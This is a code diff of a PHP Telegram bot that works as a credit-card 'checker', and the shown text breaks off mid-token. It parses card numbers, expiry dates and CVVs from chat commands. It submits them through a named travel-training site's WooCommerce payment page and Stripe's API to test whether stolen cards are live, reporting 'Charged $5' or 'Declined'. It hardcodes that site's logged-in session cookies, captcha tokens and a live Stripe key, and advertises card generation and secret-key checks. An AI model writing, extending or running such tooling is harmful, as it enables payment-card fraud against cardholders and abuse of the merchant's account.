@@ -398,7 +398,7 @@ if (file_exists($archivo) && filesize($archivo) > 0) {
 }
 
 $admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
-
+$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
 
 //-----DATOS DE PRUEBA LOCAL--------//
 /*
@@ -739,7 +739,7 @@ sendMessage($chat_id,$respuesta,$message_id);
 }
 // Cmds Commands
 elseif((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0)) {
-        $respuesta = "ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n➩ List Command Gates ✔\n⁕ Usage: /gts\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆- - - - - - - - - -- - - - - - - - - -\n⌦ Bin Check ✔\n⁕ Usage ➟ /bin xxxxxx\n⌦ Checker IBAN ✔\n⁕ Usage ➟ /iban xxxxxx\n⌦ SK Key Check ✔\n⁕ Usage ➟ /sk sk_live_xxxx\n⌦ Gen ccs ✔\n⁕ Usage ➟ /gen xxxxxx\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆\n- - - - - - - - - -- - - - - - - - - -\n° ᭄ Basica ✔\n⁕ Usage ➟ /extb ᴄᴄs\n° ᭄ Indentacion ✔\n⁕ Usage ➟ /extb ᴄᴄs\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n➩ List Command Gates ✔\n⁕ Usage: /gts\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆\n- - - - - - - - - -- - - - - - - - - -\n⌦ Bin Check ✔\n⁕ Usage ➟ /bin xxxxxx\n⌦ Checker IBAN ✔\n⁕ Usage ➟ /iban xxxxxx\n⌦ SK Key Check ✔\n⁕ Usage ➟ /sk sk_live_xxxx\n⌦ Gen ccs ✔\n⁕ Usage ➟ /gen xxxxxx\n\n☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆\n- - - - - - - - - -- - - - - - - - - -\n° ᭄ Basica ✔\n⁕ Usage ➟ /extb ᴄᴄs\n° ᭄ Indentacion ✔\n⁕ Usage ➟ /extb ᴄᴄs\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -749,13 +749,13 @@ elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strp
 }
 
 elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Command ($5) ✔\n➣ Checker ➟ /en\n⁕ Status: ON!✅\n\n🔥 Carged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Charged ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Braintree Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /en\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /br\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
 elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
         //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree CCN_V3 ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -1198,8 +1198,8 @@ editMessage($chat_id,$respuesta,$id_text);
 
 
 elseif((strpos($message, "!en") === 0)||(strpos($message, "/en") === 0)||(strpos($message, ".en") === 0)){
-$lista = preg_replace('/\s+/', '', $lista);
-$lista = substr($message, 3);
+//$lista = preg_replace('/\s+/', '', $lista);
+$lista = substr($message, 4);
 
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = trim($i[0]);
@@ -1395,8 +1395,8 @@ ob_flush();
 
 
 elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){
-$lista = preg_replace('/\s+/', '', $lista);
-$lista = substr($message, 3);
+//$lista = preg_replace('/\s+/', '', $lista);
+$lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = trim($i[0]);
 $mes   = trim($i[1]);
@@ -1515,14 +1515,16 @@ if ($respo == "SUCCEEDED"){
     $respo = "Charged $5";
 }
 // Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
+$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
+
 if (array_in_string($respo, $live_array)) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = True;
 } elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 } else {
-    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: GATE ERROR ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
     $live = False;
 }
 
@@ -2510,20 +2512,33 @@ $cc = implode('+', $partes);
 
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
+
+///EXTRAE EL NONCE//
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
+  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
-  CURLOPT_MAXREDIRS => 10,
-  CURLOPT_TIMEOUT => 30,
-  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-  CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2F',
+  CURLOPT_MAXREDIRS => 10,                                                                CURLOPT_TIMEOUT => 30,                                                                  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                                          CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&i13_recaptcha_payment_method_token=03AFcWeA6foAp_rGd2sG9ZMJLBe-M4eaFwhSZbI0_m48A3FwGDjldZvu7c9cYidlfJIfJRuz_f2cqn-3U8Lp9YAcTmv8s8wQPvzHojpHeIDwAg0OoB04f-pqYcDYrlhs22DIak-XTN7amGQTwXRsooPHW8rAK7hp0FbQI69PQJyIZ-EOx4xT7A52t5e5FjfEjFegwAbKZ9pL3LqMGPOkzo25TkH7l1FFm_X5uFrIRIBbyLuKS3rRox0Tr983Leigv1j5_K5MYM0B7ot2mthbC7G5kT2qqxlnW01bbeNy81h-eMrHYLqv_kZv1-EsccxNf7nsZg2EWlPqAYuLyVdX9G7ODKgeV2-xF3agKKRB5CMWqC03D8xQsOb3FyDf1UCtppGU-taMXGnIkJd1GRHcqBQLKXz-FoUUVgiIAoQUXUP2eCvBLBitNHCFNiS0f0LGgBAFGB-2nAmZpdiCX5NTCuxA9xJ9yDeG5djLpiRGdgLTC8H5A1D0Weo6Lc9-4D4VQtlUde1icdvkFlMzQtwlktDh3jcV3kCsOoLrupcBj8rt1EXBOlQCzUSbLE9l9SdTYx7-Q3Ep3eyFlh4aFrOR-t8RqzFDlufbWI5Hyfa49Xo_GdRpnkm9I5iGYb-Le-Mqf6hkNRoM9LBd1-czOUTLgY-7j2WKOCRxNZpo1nO2qQXrxjemn9KkL1Khs1PhjgpNvVYQ5nJYoTNwkiAg_0YeWW11rSsHQi25o1U6zrN1FtLHzAWird-hpcznfTXzTKZp6lWHfs5RHcP5xEEMGu6u51YPoJnln2LbvH_uLrbYLd6ithc4a9eI2w2wUJs4mnlSl1mjuEadLerVHuo5nbxDMZIjcP96KFJx6tfL-mux-DTwBnvYhN5cbF3XfaoritS5gKef5D0OKHfdzWqRUkfJz5Fq2URv9KhsfTua4sjvKpQI2RM9r8pbDWLvE0nij4jA_m1XG327U9fsFdZI-DudmnOTI5Xb1bN1BaOr3emqIK6IVu4MzCYcwH2chj6O5Ej1LCK00FudRwcRJVm_y8CIy0B8rt67Yav3HQc9wHhEGYk-tPTz4y_rFGfA2k1QZMvWtDieDoOcRAE41waNKV6a9Nji-A3Rv4ZdZWD6f_PBgexDt_tjkx2aghGHr901kpUQlr7bXbPEumSCLKeoJRy28nlgIqZx0Rv-gPSi7BtxsSO2Ls43G4tuUoXPPJSORcigzr742uC65fzk-CEaonjWEE9sdQYn7GRquKGDIexa3gGUm2UNOkkUEaCrnd2HdGk0xiWGUbGx9DxvHPb6YBWgnb-LsNohZ-Etjhh1BuHcnpr8oAC0X2FVlGca3LU-xkmgf6F38SABqxNog420Nqr8atEzgoCq4NXOlfXwAKvJKDx_NWWEss4mAMERdCEP87U7cwr7u8V-aOLLaOTHNKZTt73ly9Kjxz8AbjsuR2gvmTNziDlD5ReUKNgrXelvxxy8xfF6pz5dYxUOrR4mfSI3SfofuLboxxnWBJbfYMj-UG0bPCymLkqBRIRy_Wfw85bDibZ1G22011gEwwSRmlFWf8K92AfThrmxTXNBd4pqquEg6oFm2YlB7ycv8gmHYxf4czrpSbpDNC2h1ZZMxwa0xkhXM56yh90YLElhJ8HVyAOHVCf8eKGwWRzzAOtJrSHqhiZq6YOwlc3QXCFb97LJSxGbDfsei-I7GQGC2-FCh2cv4NJHb2ioqO-T19CNGfbSbcdUvVs-p0juJ6g4CBOkTQIxD8gM3Sv7p5afTme_xYZfQyAr6PscuFj1uLaq-0N7FNkPRrt9583bsXg1rOwLa-SudO8nOultL7HIBLfi3tqkFbdbhA_0pcKDZRuF_h3ZhT7gbPtlMtrxcN6fVtRBTBe1U5bEiCbcg0jbPH5BhdYG9R1oeRuSUsp9aHL-EMJy7dwQ8bMMY55K_i9qPm-SnFvvuxVSR8gkdRrGL-yIi4GjnZBSODuT-9Ac6ipQE5YLyexcR755QghPEW6--mvgkPrt5SZH3uhylqrVKZOK9d6w-kYpg9ZGWSmTo9c6SUdQGR1jakc9rPodr7XVUytge3zqMt2oZf5OiIhapvXD16WqJ-oYOYvifG5l_LpsLytczI_kkA_Q7qFcsNWf8hUiJ5JSlCzy5xGSm-tgXT3YeulMizWlb4RoGQVpHzBSbNKzVTxAb86vHOanikS5F_2q1twDVV4mzyknIN1GkdXlRPtsPfHS64BE8ZEIyrrEbmX2opz6grvUHTMyEVZ4BeolTdTdEIl3INkSBzdU842cXr7OKxr1B_-ESe2YQ&woocommerce-add-payment-method-nonce=a7151db41c&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'cache-control: max-age=0',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://www.thetravelinstitute.com/',
+    'upgrade-insecure-requests: 1',
+    'origin: https://www.thetravelinstitute.com',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.5',
+    'sec-fetch-site: same-origin',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-user: ?1',
+    'sec-fetch-dest: document',
+    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
+    'priority: u=0, i',
   ],
 ]);
 
@@ -2534,11 +2549,12 @@ $patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
 preg_match($patron_nonce, $response, $matches_nonce);
 $nonce = $matches_nonce[1];
 curl_close($curl);
+echo "$nonce\n";
 
 
 
+///EXTRAE EL ID////
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -2547,24 +2563,31 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=43855&client_attribution_metadata%5Bclient_session_id%5D=d65d0026-84e4-4fec-83f1-a3244cc849e5&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=aa647898-0f7b-4647-a052-33a1d2f18d9464e5e8&muid=aa379a42-e19a-4c90-9052-16328908a242d00773&sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoianlGTXJ1c0txTnRkMXJXSEhqMC9MYUltZG9IaXZqM2RDeFVSWXhpTjFmMzRxc0JCMUlteTVUdVg0a1VZbWI5UDg1MGtUemIxKzQ2WThyZWg5aUl6TjhFSWJrRGVNTTlXT2JmT1VseklsYUtRUWRNRjdoVXVadHN4SnNRTWJ5U1B1cHFsN0ExQXZaYmpHbk0rL3RYelhMNnRaT0pTR1ZXNUF1RjVLMXRCd0dncUFNTjI0T1JoL1JNUjlQdjhrNmc4TTBOaW5VNE5ERmNwempZbExaODJXSlNBMWJBZWd5MFdaTXBBQWgxeEhLcDl2NkJEcllhcUtYbENoemVJUFNPeHg3L3djV0JMei9OWEhTSEtYbXZVUDVuRkhXNko5UFg4cjZ2MFAxblJHMElZSTl0aDBuSzVUcTdTTnJjYmNsRmZoWUZUZGhtY2pHQ24vM1pZa2xxblI5TTM1MXFDVldOTjJCdWJqcGVONHBSQXlQOWRrS1BYdXhNeDE0djRiSzI1R0tpcXp0Y0lmL25UNkw0bnNpUjZWbk1GdGdqY2VmUFZvd1QvMGdyMUs4akNHc1c4dy96bTlHcm9pZlAwWm1UaERvWjJaZ2ZiNEtpQ0ZaUlp2Vlk0VVZJS2w3YnRucitxNmNOSE1mbENIYm9qUldlRXY5TXh3ekFKM3NXMjB3UWQrZXNqNE9VeGJBdGZPZTFydVF1T2VSV0RLK2lnTU90Yk9jTXRFYTdScDBxeTB0ZTZ6VzFtb0tUUkROQ3FUYVRub0Q5QVZxTDMxYkFYa01HKzJ1azYxdlltWWp3UjQ5eVlFdmh3ZEo5RWlEMUdpc2hPaHFJZnpIUmxicXhEUXF3N2hKeUc5a1Y5dXVBWFJjTDJIWTNWS3JHRzF3em1kTVBvbXJrT3IyNGh3WUVGYUxHdDlLY0dwMnMwQmpnM09pSVlOenFRcGhBNjFJREoza2Nha09MTUpJcVE1eUdza2xMdDNYWU5SWVEyYmtma1huZDZtRTIxQjlUMTRvSTEwWnh6clJDVGtjM3crT1Y4NXhrUGtGcjVhU2lWT3NJaFU2QUtSMy82b01FL2FOakNpU0ZmYkxMbDJDUmgxelIrYVRsa3prR2RJaVg4b1Jxb2I2WU9DSS9ha2NtMGU3S3FnbWJBckZHRGRSSjZWUUFrbHBsNlAxWWRqeG41eHN4bVR3Ui96amxDVXdYTk1QczJEcnFRc3lsRE10dWsyUUhhbGR0MEUrcTJaQzFuckZYMXJJWVVDWExoUHFoc1g2NzVJamNWb29mbGErYUdqVkt3SzBNT3dnYzVyYVhmQVB5a1gvemxsWU5tQzRFTjZRaG9VYWtUWjNMUzNTVmFZYnFjcFJnbUlrekhTbE82ZStyZjZsaSs5Z000SldndDNBK1RuVytHdS84RmdNKzJKcFZ2SEJlYTdwOFIwbUdaS1ozV3VLMmZ4S1pPOE0rT0ZGRlJES3VObmM5SWRaVjdUMzV0UmQyblpPYVhnL09wYzcxS2gwbUVYU1FWdGx4T3dzQnJHOFRaN0lmcjBQMWlMUVU4N0MwSVA3NjZzZEdNRWt0WFZqNnJVUGt6U0hTT2ZTZnhGK1dPa2tWTjN5MG82T3VRVk9oZHpRT3NqNEtHcWhhNkZCSFdYa1RRVWNub2hPMDBGSzNhWmFHVnBJRGdjNWRia3kzWXZvMmJmajhTTGlLdHR5U0tCaEZoLzVWVk9IQWJXSUhOUE14U3lVNkxiYzRaQWRxMGdtKy9zdlZxQ1NHWjdFNS9ZRWtnNldUVFA1UmRMU0xqaERld2hqaFFDSzhKRlBnVnJOcGViZ25wSjRPenBuS1g1K3dmVlNHRTFtWjEwa0VDR09LdUdHZlU0ZGh1ME1zdHR1WFdzTU5CcW9oUDBBbHJIZmpINmhTSFJPYS9uV3kxeER4VlNxWTRqdS9haXR0dFdCdmJuSWhBTURNb3hoUTZjYnRvSlc4NjNGajFFVmhVdjQyQnQ2a0ZReHB6MnJ1UHpTVHQxS21HeHdOQjJoMnJ